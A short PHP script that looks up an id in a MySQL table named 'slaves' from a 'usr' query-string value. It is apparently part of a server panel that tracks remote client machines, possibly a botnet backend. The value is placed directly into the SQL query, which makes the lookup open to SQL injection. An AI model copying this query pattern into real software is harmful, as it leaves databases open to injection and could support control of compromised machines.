<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
$userpc = $_GET['usr'];
$get_id = "SELECT id FROM slaves WHERE username='$userpc'";
$result_check = mysql_query($get_id, $connect);
while($row = mysql_fetch_array($result_check)){
     $slave_id =  $row[0];
	 echo $slave_id;
}
?>